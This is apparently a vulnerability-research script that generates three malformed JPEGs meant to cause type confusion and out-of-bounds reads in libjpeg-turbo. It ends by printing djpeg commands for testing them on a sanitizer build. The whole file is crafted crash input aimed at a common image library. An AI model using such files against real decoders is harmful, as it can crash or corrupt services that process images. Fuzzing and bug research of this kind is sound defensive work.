#!/usr/bin/env python3
"""
Create corrupted JPEG files to trigger type confusion in libjpeg-turbo
Strategy: Create JPEGs with malformed markers that might cause precision confusion
"""

import struct
import sys

def create_precision_confusion_jpeg():
    """
    Create a JPEG that claims 8-bit precision but has markers suggesting 12-bit
    This might confuse the state machine and cause type confusion
    """
    data = bytearray()
    
    # SOI
    data.extend([0xFF, 0xD8])
    
    # JFIF APP0
    data.extend([0xFF, 0xE0])
    data.extend([0x00, 0x10])  # Length
    data.extend(b'JFIF\x00')
    data.extend([0x01, 0x01])  # Version
    data.extend([0x00])        # Units
    data.extend([0x00, 0x01])  # X density
    data.extend([0x00, 0x01])  # Y density
    data.extend([0x00, 0x00])  # Thumbnail
    
    # DQT with 8-bit precision
    data.extend([0xFF, 0xDB])
    dqt_len = 2 + 1 + 64
    data.extend([(dqt_len >> 8) & 0xFF, dqt_len & 0xFF])
    data.append(0x00)  # Precision 0 (8-bit), table 0
    for i in range(64):
        data.append(16)
    
    # SOF0 with 8-bit precision
    data.extend([0xFF, 0xC0])
    sof_len = 2 + 1 + 2 + 2 + 1 + (1 * 3)
    data.extend([(sof_len >> 8) & 0xFF, sof_len & 0xFF])
    data.append(8)  # 8-bit precision - THIS CAUSES 1-BYTE ALLOCATION!
    data.extend([0x00, 0x40])  # Height: 64
    data.extend([0x00, 0x40])  # Width: 64
    data.append(1)  # 1 component
    data.append(1)  # Component ID
    data.append(0x11)  # Sampling
    data.append(0)  # Quant table
    
    # DHT - DC table
    data.extend([0xFF, 0xC4])
    dht_dc_data = bytearray()
    dht_dc_data.append(0x00)  # Class 0 (DC), ID 0
    bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
    dht_dc_data.extend(bits)
    values = list(range(12))
    dht_dc_data.extend(values)
    dht_len = 2 + len(dht_dc_data)
    data.extend([(dht_len >> 8) & 0xFF, dht_len & 0xFF])
    data.extend(dht_dc_data)
    
    # DHT - AC table
    data.extend([0xFF, 0xC4])
    dht_ac_data = bytearray()
    dht_ac_data.append(0x10)  # Class 1 (AC), ID 0
    bits = [0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d]
    dht_ac_data.extend(bits)
    values = list(range(162))
    dht_ac_data.extend(values)
    dht_len = 2 + len(dht_ac_data)
    data.extend([(dht_len >> 8) & 0xFF, dht_len & 0xFF])
    data.extend(dht_ac_data)
    
    # SOS
    data.extend([0xFF, 0xDA])
    sos_len = 2 + 1 + (1 * 2) + 3
    data.extend([(sos_len >> 8) & 0xFF, sos_len & 0xFF])
    data.append(1)  # 1 component
    data.append(1)  # Component ID
    data.append(0x00)  # DC/AC tables
    data.extend([0, 63, 0])  # Spectral selection
    
    # Add compressed data with extreme values that might trigger OOB access
    # These values should cause large indices into sample_range_limit
    for i in range(500):
        # Add patterns that will decode to extreme values
        val = (i * 37) & 0xFF
        data.append(val)
        if val == 0xFF:
            data.append(0x00)  # Byte stuffing
    
    # EOI
    data.extend([0xFF, 0xD9])
    
    return bytes(data)

def create_malformed_progressive_jpeg():
    """
    Create a progressive JPEG with intentionally conflicting scan parameters
    """
    data = bytearray()
    
    # SOI
    data.extend([0xFF, 0xD8])
    
    # JFIF
    data.extend([0xFF, 0xE0, 0x00, 0x10])
    data.extend(b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')
    
    # DQT
    data.extend([0xFF, 0xDB, 0x00, 0x43, 0x00])
    for i in range(64):
        data.append(16)
    
    # SOF2 (Progressive) with 8-bit
    data.extend([0xFF, 0xC2])
    data.extend([0x00, 0x0B])  # Length
    data.append(8)  # 8-bit precision
    data.extend([0x00, 0x80])  # Height: 128
    data.extend([0x00, 0x80])  # Width: 128
    data.append(1)
    data.extend([1, 0x11, 0])
    
    # DHT
    data.extend([0xFF, 0xC4, 0x00, 0x1F, 0x00])
    bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
    data.extend(bits)
    data.extend(list(range(12)))
    
    # First SOS - DC only
    data.extend([0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00])
    for i in range(200):
        data.append((i * 5) & 0xFF)
        if data[-1] == 0xFF:
            data.append(0x00)
    
    # Second SOS - AC with large values
    data.extend([0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x01, 0x3F, 0x00])
    for i in range(300):
        data.append((i * 7 + 200) & 0xFF)
        if data[-1] == 0xFF:
            data.append(0x00)
    
    # EOI
    data.extend([0xFF, 0xD9])
    
    return bytes(data)

def create_overflow_trigger_jpeg():
    """
    Create JPEG designed to cause overflow in sample_range_limit access
    """
    data = bytearray()
    
    # SOI
    data.extend([0xFF, 0xD8])
    
    # APP0
    data.extend([0xFF, 0xE0, 0x00, 0x10])
    data.extend(b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')
    
    # DQT with extreme values
    data.extend([0xFF, 0xDB, 0x00, 0x43, 0x00])
    for i in range(64):
        # Very small quantization values to amplify coefficients
        data.append(1)
    
    # SOF0 - 8 bit, small image
    data.extend([0xFF, 0xC0, 0x00, 0x0B])
    data.append(8)  # 8-bit precision
    data.extend([0x00, 0x20])  # 32 pixels
    data.extend([0x00, 0x20])
    data.append(1)
    data.extend([1, 0x11, 0])
    
    # DHT - minimal tables
    data.extend([0xFF, 0xC4, 0x00, 0x1F, 0x00])
    bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
    data.extend(bits)
    data.extend(list(range(12)))
    
    data.extend([0xFF, 0xC4, 0x01, 0xA2, 0x10])
    bits = [0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d]
    data.extend(bits)
    data.extend(list(range(162)))
    
    # SOS
    data.extend([0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00])
    
    # Compressed data designed to decode to extreme coefficient values
    # Pattern that should produce large DC/AC coefficients
    extreme_pattern = [
        0xFF, 0x00,  # Escape 0xFF
        0xF0,        # 16 zeros
        0xFF, 0x00,
        0xAA, 0x55, 0xAA, 0x55,  # Alternating pattern
        0xFF, 0x00,
        0x00,        # EOB
    ] * 20
    
    for byte in extreme_pattern:
        data.append(byte)
    
    # EOI
    data.extend([0xFF, 0xD9])
    
    return bytes(data)

def main():
    print("Creating corrupted JPEG files to trigger type confusion...")
    
    print("\n[1] Creating precision_confusion.jpg")
    with open('precision_confusion.jpg', 'wb') as f:
        f.write(create_precision_confusion_jpeg())
    print("    ✓ Created")
    
    print("\n[2] Creating malformed_progressive.jpg")
    with open('malformed_progressive.jpg', 'wb') as f:
        f.write(create_malformed_progressive_jpeg())
    print("    ✓ Created")
    
    print("\n[3] Creating overflow_trigger.jpg")
    with open('overflow_trigger.jpg', 'wb') as f:
        f.write(create_overflow_trigger_jpeg())
    print("    ✓ Created")
    
    print("\n✅ All corrupted JPEG files created!")
    print("\nTest with djpeg:")
    print("  cd build_asan")
    print("  ./djpeg-static -outfile /dev/null ../precision_confusion.jpg")
    print("  ./djpeg-static -outfile /dev/null ../malformed_progressive.jpg")
    print("  ./djpeg-static -outfile /dev/null ../overflow_trigger.jpg")

if __name__ == '__main__':
    main()
